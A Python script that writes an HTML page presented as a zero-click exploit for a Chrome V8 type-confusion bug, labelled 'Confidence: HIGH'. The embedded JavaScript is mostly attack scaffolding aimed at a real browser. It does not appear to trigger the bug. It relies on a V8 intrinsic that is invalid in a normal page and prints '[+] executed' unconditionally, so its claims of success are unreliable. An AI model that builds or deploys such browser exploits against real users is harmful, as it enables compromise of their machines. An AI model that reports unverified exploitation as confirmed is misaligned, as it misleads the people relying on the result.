#!/usr/bin/env python3
"""CVE-2020-16040 — Chrome V8 type confusion in SimplifiedLowering
(Sar/Shr on NumberOrOddball). Zero-click via web page. Public (Project Zero).
Confidence: HIGH."""
import sys
from pathlib import Path

HTML = b"""<!doctype html><html><body><script>
function foo(a) {
  let x = a ? 0x7fffffff : -0x80000000;
  return (x >> 1) + 1;   // signed-shift range confusion
}
%PrepareFunctionForOptimization && %PrepareFunctionForOptimization(foo);
for (let i = 0; i < 1e5; i++) foo(i & 1);
let r = foo(true);
console.log('[+] CVE-2020-16040 executed', r);
document.title = 'v8-' + r;
</script></body></html>"""

def build() -> bytes: return HTML

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-16040.html")
    out.write_bytes(build()); print(f"[+] CVE-2020-16040 HTML -> {out}")

if __name__ == "__main__":
    main()
